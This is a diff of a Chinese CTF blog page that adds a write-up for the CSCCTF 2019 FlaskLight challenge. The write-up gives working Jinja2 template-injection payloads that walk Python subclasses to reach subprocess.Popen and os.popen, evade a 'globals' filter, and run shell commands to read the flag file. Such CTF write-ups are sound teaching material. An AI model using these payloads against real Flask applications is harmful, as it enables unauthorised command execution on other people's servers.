+<h2 id="CSCCTF-2019-Qual-FlaskLight"><a href="#CSCCTF-2019-Qual-FlaskLight" class="headerlink" title="[CSCCTF 2019 Qual]FlaskLight"></a>[CSCCTF 2019 Qual]FlaskLight</h2><p>题目提示flask，先用49测试返回49</p>
+<p>然后测试所有返回的类，发现存在<code>subprocess.Popen</code>可以用来执行命令</p>
+<p>然后爆破发现在第258位置 </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?search=&#123;&#123;().__class__.__base__.__subclasses__()[258]&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>然后利用模块进行模板注入</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?search=&#123;&#123;().__class__.__base__.__subclasses__()[258](&#x27;ls&#x27;,shell=True,stdout=-1).communicate()[0].strip()&#125;&#125;</span><br><span class="line">?search=&#123;&#123;().__class__.__base__.__subclasses__()[258](&#x27;ls /flasklight&#x27;,shell=True,stdout=-1).communicate()[0].strip()&#125;&#125;</span><br><span class="line">?search=&#123;&#123;().__class__.__base__.__subclasses__()[258](&#x27;cat /flasklight/coomme_geeeett_youur_flek&#x27;,shell=True,stdout=-1).communicate()[0].strip()&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>代替shell命令：<br><code>p=ls -l</code><br>等效于<br><code>p=Popen([‘ls’,’-l’],stdout=PIPE).communicate()[0]</code></p>
+<p>这里stdout不用PIPE用-1我也不理解，是不是因为没有管道，直接输出就可</p>
+<p>communicate()[0]则表示会把输出放在内存，而不是管道里</p>
+</blockquote>
+<p>当然也可以用有os模块的来获取，注意globals被过滤了</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">#没有内置的os模块的类</span><br><span class="line">&#123;&#123;[].__class__.__base__.__subclasses__()[59].__init__[&#x27;__glo&#x27;+&#x27;bals__&#x27;][&#x27;__builtins__&#x27;][&#x27;eval&#x27;](&quot;__import__(&#x27;os&#x27;).popen(&#x27;cat /flasklight/coomme_geeeett_youur_flek &#x27;).read()&quot;)&#125;&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#内含os模块的类（不需要import os）</span><br><span class="line">&#123;&#123;[].__class__.__base__.__subclasses__()[71].__init__[&#x27;__glo&#x27;+&#x27;bals__&#x27;][&#x27;os&#x27;].popen(&#x27;cat coomme_geeeett_youur_flek&#x27;).read()&#125;</span><br></pre></td></tr></table></figure>
+
 
         </div>
         
@@ -457,7 +564,7 @@
                     
                 </div>
                 <div class="pull-date">
-                <span>最后编辑：2022-03-03</span>
+                <span>最后编辑：2022-03-13</span>
                 </div>
             </div>
         </footer>
@@ -504,7 +611,7 @@
                 文章
             </span>
             <span class="count">
-                8
+                7
             </span>
         </a>
         <a class="meta-item" href="/categories/">
@@ -560,18 +667,16 @@
         
           
           
-            <a class="list-group-item" href="/2022/02/15/CTFHub-Web-RCE/"><i class="fa  fa-book"></i> CTFHub-Web-RCE</a>
-            
-          
-        
-          
-          
             <a class="list-group-item" href="/2022/02/13/CTFHub-Web-HTTP%E5%8D%8F%E8%AE%AE/"><i class="fa  fa-book"></i> CTFHub-Web-HTTP协议</a>
             
           
         
           
+          
+            <a class="list-group-item" href="/2022/01/24/CTFHub-Web-SSRF/"><i class="fa  fa-book"></i> CTFHub-Web-SSRF</a>
             
+          
+        
           
             
           
